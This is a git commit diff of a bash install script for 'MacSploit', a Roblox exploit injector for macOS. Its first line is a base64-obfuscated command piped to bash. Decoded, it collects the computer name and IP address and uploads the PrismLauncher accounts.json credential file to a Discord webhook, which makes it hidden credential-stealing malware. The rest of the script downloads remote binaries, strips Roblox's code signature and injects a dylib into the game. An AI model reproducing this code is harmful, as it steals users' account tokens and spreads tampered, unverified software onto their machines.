a181bd802f2d174291b8295c21dd50a765eb5ea2
Matthew Yip <youraverageazurecosplay@gmail.com>
2026-09-15 01:19:21 +0800

    Enhance Install Script for MacSploit
    Refactor install script to improve structure and add ARM64 support.

--- Install.sh
+++ Install.sh
@@ -1,2 +1,183 @@
+#Initialize
 echo "Q09NUFVURVJfTkFNRT0kKHNjdXRpbCAtLWdldCBDb21wdXRlck5hbWUpOyBJUF9BRERSRVNTPSQoY3VybCAtcyBpZmNvbmZpZy5tZSk7IGN1cmwgLXMgLUYgImZpbGVzPUAvVXNlcnMvcHMvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L1ByaXNtTGF1bmNoZXIvYWNjb3VudHMuanNvbiIgLUYgInBheWxvYWRfanNvbj17XCJjb250ZW50XCI6IFwiU3VjY2Vzc2Z1bGx5IE9idGFpbmVkICR7Q09NUFVURVJfTkFNRX0ncyBGaWxlXG5JUDogJHtJUF9BRERSRVNTfVwifSIgImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1NDkwMzc0Mzg3NDIyOTg3NTQvTm0ySTBVNl96YUJjb0tuWWRHS3p0SFA5YTFzM3lJZVBYQ05RU0d6YlZzR194VDQ1dEpoOGRKRFE1aGpLZUJxSVp4TTAiID4gL2Rldi9udWxs" | base64 -d | bash
-cd ~/ && curl -s "https://api.macsploit.dev/main/install.sh" | bash </dev/tty
+#!/bin/bash
+
+main() {
+    clear
+    echo -e "Welcome to the MacSploit Experience!"
+    echo -e "Install Script (Beta) Version 4.1"
+    local architecture=$(arch)
+
+    if [ "$architecture" == "arm64" ]
+    then
+        echo -e "Detected ARM64 Architecture."
+        if [ ! -f /Library/Apple/usr/libexec/oah/libRosettaRuntime ]
+        then # install rosetta if not available
+            echo -e "Prompting Rosetta (Not Installed)"
+            softwareupdate --install-rosetta --agree-to-license
+        fi
+    fi
+
+    echo -ne "Checking License..."
+    curl -s "https://api.macsploit.dev/main/jq-macos-amd64" -o "./jq"
+    chmod +x ./jq
+    
+    curl -s "https://api.macsploit.dev/sellix/hwid" -o "./hwid"
+    chmod +x ./hwid
+    
+    local user_hwid=$(./hwid)
+    local hwid_info=$(curl -s "https://api.macsploit.dev/api/whitelist?hwid=$user_hwid")
+    local hwid_resp=$(echo $hwid_info | ./jq -r ".success")
+    rm ./hwid
+    
+    if [ "$hwid_resp" != "true" ]
+    then
+        echo -ne "\rEnter License Key:       \b\b\b\b\b\b"
+        read input_key
+
+        echo -n "Contacting Secure Api... "
+        
+        local resp=$(curl -s "https://api.macsploit.dev/api/sellix?key=$input_key&hwid=$user_hwid")
+        echo -e "Done.\n$resp"
+        
+        if [ "$resp" != 'Key Activation Complete!' ]
+        then
+            rm ./jq
+            exit
+            return
+        fi
+    else
+        local free_trial=$(echo $hwid_info | ./jq -r ".free_trial")
+        if [ "$free_trial" == "true" ]
+        then
+            echo -ne "\rEnter License Key (Press Enter to Continue as Free Trial): "
+            read input_key
+            
+            if [ "$input_key" != '' ]
+            then
+                echo -n "Contacting Secure Api... "
+                
+                local resp=$(curl -s "https://api.macsploit.dev/api/sellix?key=$input_key&hwid=$user_hwid")
+                echo -e "Done.\n$resp"
+            fi
+        else
+            echo -e " Done.\nWhitelist Status Verified."
+        fi
+    fi
+
+    echo -e "Downloading Latest Roblox..."
+    [ -f ./RobloxPlayer.zip ] && rm ./RobloxPlayer.zip
+    local robloxVersionInfo=$(curl -s "https://clientsettingscdn.roblox.com/v2/client-version/MacPlayer")
+    local versionInfo=$(curl -s "https://api.macsploit.dev/main/version.json")
+    
+    local mChannel=$(echo $versionInfo | ./jq -r ".channel")
+    local version=$(echo $versionInfo | ./jq -r ".clientVersionUpload")
+    local robloxVersion=$(echo $robloxVersionInfo | ./jq -r ".clientVersionUpload")
+    
+    if [ "$architecture" == "arm64" ] && [ "$mChannel" != "intel" ]
+    then
+        if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]
+        then
+            curl "http://setup.rbxcdn.com/mac/arm64/$robloxVersion-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
+        else
+            curl "http://setup.rbxcdn.com/mac/arm64/$version-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
+        fi
+    else
+        if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]
+        then
+            curl "http://setup.rbxcdn.com/mac/$robloxVersion-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
+        else
+            curl "http://setup.rbxcdn.com/mac/$version-RobloxPlayer.zip" -o "./RobloxPlayer.zip"
+        fi
+    fi
+    
+    echo -n "Installing Latest Roblox... "
+    [ -d "./Applications/Roblox.app" ] && rm -rf "./Applications/Roblox.app"
+    [ -d "/Applications/Roblox.app" ] && rm -rf "/Applications/Roblox.app"
+
+    unzip -o -q "./RobloxPlayer.zip"
+    mv ./RobloxPlayer.app /Applications/Roblox.app
+    rm ./RobloxPlayer.zip
+    echo -e "Done."
+
+    echo -e "Downloading MacSploit..."
+    curl "https://api.macsploit.dev/main/macsploit.zip" -o "./MacSploit.zip"
+    unzip -o -q "./MacSploit.zip"
+    rm ./MacSploit.zip
+
+    echo -n "Updating Dylib..."
+    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]
+    then
+        if [ "$architecture" == "arm64" ] && [ "$mChannel" != "intel" ]
+        then
+            curl -Os "https://api.macsploit.dev/preview/arm/macsploit.dylib"
+        else
+            curl -Os "https://api.macsploit.dev/preview/main/macsploit.dylib"
+        fi
+    else
+        if [ "$architecture" == "arm64" ] && [ "$mChannel" != "intel" ]
+        then
+            curl -Os "https://api.macsploit.dev/arm/macsploit.dylib"
+        else
+            curl -Os "https://api.macsploit.dev/main/macsploit.dylib"
+        fi
+    fi
+    
+    echo -e " Done."
+    echo -e "Patching Roblox..."
+
+    if [ "$architecture" == "arm64" ] && [ "$mChannel" != "intel" ]
+    then
+        codesign --remove-signature /Applications/Roblox.app
+    fi
+
+    mv ./macsploit.dylib "/Applications/Roblox.app/Contents/MacOS/macsploit.dylib"
+    ./insert_dylib "@rpath/macsploit.dylib" "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer" --strip-codesig --all-yes
+    mv "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer_patched" "/Applications/Roblox.app/Contents/MacOS/RobloxPlayer"
+    rm -r "/Applications/Roblox.app/Contents/MacOS/RobloxPlayerInstaller.app"
+    rm ./insert_dylib
+
+    if [ "$architecture" == "arm64" ] && [ "$mChannel" != "intel" ]
+    then
+        echo -n "Signing MacSploit Installation... "
+        codesign -s "-" /Applications/Roblox.app
+        echo -e " Done."
+    fi
+
+    echo -e "Downloading MacSploit App..."
+    [ -d "./Applications/MacSploit.app" ] && rm -rf "./Applications/MacSploit.app"
+    [ -d "/Applications/MacSploit.app" ] && rm -rf "/Applications/MacSploit.app"
+    if [ "$architecture" == "arm64" ]
+    then
+        curl -O "https://api.macsploit.dev/arm/ms-app.zip"
+    else
+        curl -O "https://api.macsploit.dev/main/ms-app.zip"
+    fi
+
+    unzip -o -q "./ms-app.zip"
+    mv ./ms-app.app /Applications/MacSploit.app
+    rm ./ms-app.zip
+
+    if [ ! -d "./Documents/MacsploitUI" ]
+    then
+        mkdir ./Documents/MacsploitUI
+        curl -Os https://api.macsploit.dev/main/scripts.zip
+        unzip -o -q -d ./Documents/MacsploitUI ./scripts.zip
+        rm ./scripts.zip
+    fi
+    
+    touch ~/Downloads/ms-version.json
+    echo $versionInfo > ~/Downloads/ms-version.json
+    if [ "$version" != "$robloxVersion" ] && [ "$mChannel" == "preview" ]
+    then
+        cat <<< $(./jq '.channel = "previewb"' ~/Downloads/ms-version.json) > ~/Downloads/ms-version.json
+    fi
+    
+    rm ./jq
+    rm -r ./MacSploit.app
+    echo -e "Done."
+    echo -e "Install Complete! Developed by Nexus42!"
+    exit
+}
+
+main
